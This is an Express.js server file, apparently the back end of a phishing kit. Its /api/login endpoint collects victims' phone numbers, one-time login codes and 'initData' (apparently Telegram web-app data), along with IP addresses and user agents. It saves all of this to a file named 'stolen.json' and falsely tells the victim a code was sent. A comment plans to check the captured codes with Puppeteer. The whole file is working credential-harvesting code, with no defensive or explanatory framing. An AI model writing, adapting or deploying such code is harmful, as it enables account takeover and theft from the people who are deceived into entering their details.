const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Раздаём статику (фронтенд)
app.use(express.static(path.join(__dirname, './')));

const logFile = path.join(__dirname, 'stolen.json');

app.post('/api/login', (req, res) => {
    const { phone, code, step, initData } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const timestamp = Date.now();

    const logEntry = {
        timestamp,
        ip,
        step,
        phone,
        code: code || null,
        initData: initData || null,
        userAgent: req.headers['user-agent']
    };

    let logs = [];
    try {
        if (fs.existsSync(logFile)) {
            logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        }
    } catch (e) {}
    
    logs.push(logEntry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    console.log(`[${step}] ${phone} ${code ? 'code: '+code : ''}`);

    if (step === 'phone') {
        res.json({ success: true, message: 'Код отправлен' });
    } else {
        // Тут можно было бы проверить код через Puppeteer, но пока просто сохраняем
        res.json({ success: true });
    }
});

app.post('/api/resend', (req, res) => {
    const { phone } = req.body;
    console.log(`Resend requested for ${phone}`);
    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
